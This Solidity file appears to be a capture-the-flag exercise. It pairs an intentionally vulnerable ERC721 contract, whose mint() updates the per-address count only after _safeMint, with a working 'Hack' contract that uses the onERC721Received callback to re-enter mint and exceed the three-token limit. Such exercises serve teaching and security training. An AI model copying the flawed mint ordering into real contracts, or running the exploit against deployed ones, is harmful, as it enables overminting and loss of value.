// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint1 is ERC721 {
    using Address for address;

    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint1", "AT") {}

    function mint() external {
        require(amountMinted[msg.sender] <= 3, "max 3 NFTs");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    function success(address _attacker) external view returns (bool) {
        return balanceOf(_attacker) == 5;
    }
}

/**
 * @notice Uses the IERC721 Receiver interface to receive minted tokens and use re-entrancy attack to keep minting.
 */
contract Hack is IERC721Receiver {
    Overmint1 immutable _target;
    uint256 private _numMinted;

    constructor(address target_) {
        _target = Overmint1(target_);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        if (_numMinted < 5) {
            unchecked {
                ++_numMinted;
            }
            _target.mint();
        }
        return IERC721Receiver.onERC721Received.selector;
    }

    function attack() external returns (bool success) {
        unchecked {
            ++_numMinted;
        }
        _target.mint();
        success = _target.success(address(this));
    }
}
